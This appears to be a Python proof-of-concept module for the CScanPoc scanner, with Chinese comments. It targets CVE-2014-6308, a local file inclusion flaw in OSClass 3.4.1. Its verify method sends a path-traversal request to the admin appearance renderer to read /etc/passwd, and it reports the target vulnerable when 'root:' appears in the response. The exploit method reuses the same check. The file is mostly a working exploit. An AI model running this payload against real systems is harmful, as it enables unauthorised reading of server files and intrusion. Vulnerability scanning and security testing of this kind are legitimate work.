# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'OSClass_0001'  # 平台漏洞编号，留空
    name = 'OSClass 3.4.1 本地文件包含漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2014-09-25'  # 漏洞公布时间
    desc = '''
        osclass是一个开源项目，允许您在没有任何技术知识的情况下轻松创建分类网站。
        Local file inclusion vulnerability where discovered in Osclass, an
        open source project that allows you to create a classifieds sites.
    '''  # 漏洞描述
    ref = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6308'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2014-6308'  # cve编号
    product = 'OSClass'  # 漏洞应用名称
    product_version = '3.4.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '575c59f7-048d-407d-9d5c-78805d87a64b'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ("/oc-admin/index.php?page=appearance&action=render&file="
                       "../../../../../../../../../../etc/passwd")
            verify_url = self.target + payload

            req = requests.get(verify_url)
            if req.status_code == 200 and 'root:' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
